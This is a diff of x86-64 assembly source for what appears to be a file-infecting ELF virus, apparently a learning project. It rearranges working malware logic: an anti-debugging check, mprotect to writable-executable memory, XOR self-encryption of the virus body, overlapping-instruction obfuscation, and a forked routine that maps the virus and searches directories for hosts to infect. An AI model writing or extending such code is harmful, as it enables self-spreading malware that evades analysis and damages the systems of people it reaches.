@@ -49,82 +49,7 @@ _h3ll0w0rld:
 %endif
 	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
-	call _4m_1_tr4c3d
-
-	cmp rax, 0x0
-	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
-	jmp .happy_mix
-	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
-		push rdx
-		lea rdi, [rel _start]
-		mov rsi, [rel entry_inject]
-		sub rdi, rsi
-		sub rsi, 8 * 3
-		add rsi, [rel length]
-		push 0x7
-		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
-		push 10
-		pop rax ; mprotect
-		syscall; change protect from file to _eof
-
-		lea rdi, [rel _virus]
-		mov rdx, rdi
-		lea rsi, [rel _params]
-		sub rdx, rsi
-		mov rsi, [rel length]
-		sub rsi, rdx ; length - (_virus - _params)
-		lea rdx, [rel _h3ll0w0rld]
-		mov rcx, KEY_SIZE
-		call _xor_encrypt
-		pop rdx
-
-	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
-	.happy_mix:
-	push 2
-	pop rdi
-	lea rsi, [rel debugging]
-	jmp $+6
-	mov rax, 0x58016a5a0c6a3713; push 12; pop rdx; push 1; pop rax
-	syscall
-
-	jmp $+4; has to skip 2 byte of instruction next line
-	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
-	;                            from right to left
-	.ft_juggling:
-	mov rax, 0xc0314837eb050f42; 42[syscall][jmp .infected][xor rax, rax]
-
-	.sneakyboi:
-	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-	jnz .code ; .xor_decrypt
-	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
-
-	.host:
-	push SYSCALL_FORK
-	pop rax; fork
-	syscall
-	cmp rax, 0x0
-	jnz _exit
-
-	; host part
-	push r14
-	call _make_virus_map
-	call _search_dir
-	call _munmap_virus
-	pop r14
-
-	jmp _exit
-	.infected:
-		push SYSCALL_FORK
-		pop rax; fork
-		syscall
-
-		cmp rax, 0x0
-		jz _virus
-
-		jmp _prg
-	debugging db `DEBUGGING..\n`, 0x0
-
-_4m_1_tr4c3d:
+	push r10
 	push rdx
 
 	push SYSCALL_GETPID; getpid
@@ -189,13 +114,88 @@ _4m_1_tr4c3d:
 		lea rsi, [rsp - 8]
 		push SYSCALL_WAIT4
 		pop rax
+		xor r10, r10; rusage
 		syscall
 
 		WEXITSTATUS rax, qword [rsp - 8]
 		add rsp, 8
 
 	pop rdx
-ret
+	pop r10
+
+	cmp rax, 0x0
+	jz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
+	jmp .happy_mix
+	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
+		push rdx
+		lea rdi, [rel _start]
+		mov rsi, [rel entry_inject]
+		sub rdi, rsi
+		sub rsi, 8 * 3
+		add rsi, [rel length]
+		push 0x7
+		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
+		push 10
+		pop rax ; mprotect
+		syscall; change protect from file to _eof
+
+		lea rdi, [rel _virus]
+		mov rdx, rdi
+		lea rsi, [rel _params]
+		sub rdx, rsi
+		mov rsi, [rel length]
+		sub rsi, rdx ; length - (_virus - _params)
+		lea rdx, [rel _h3ll0w0rld]
+		mov rcx, KEY_SIZE
+		call _xor_encrypt
+		pop rdx
+
+	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
+	.happy_mix:
+	push 2
+	pop rdi
+	lea rsi, [rel debugging]
+	jmp $+6
+	mov rax, 0x58016a5a0c6a3713; push 12; pop rdx; push 1; pop rax
+	syscall
+
+	jmp $+4; has to skip 2 byte of instruction next line
+	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
+	;                            from right to left
+	.ft_juggling:
+	mov rax, 0xc0314830eb050f42; 42[syscall][jmp .infected][xor rax, rax]
+
+	.sneakyboi:
+	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
+	jnz .code ; .xor_decrypt
+	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
+
+	.host:
+	push SYSCALL_FORK
+	pop rax; fork
+	syscall
+
+	cmp rax, 0x0
+	jnz _exit
+
+	; host part
+	push r14
+	call _make_virus_map
+	call _search_dir
+	call _munmap_virus
+	pop r14
+
+	jmp _exit
+	.infected:
+		push SYSCALL_FORK
+		pop rax; fork
+		syscall
+
+		cmp rax, 0x0
+		jz _virus
+
+		jmp _prg
+	debugging db `DEBUGGING..\n`, 0x0
 
 ;                      v dst       v len      v key       v key_size
 _xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
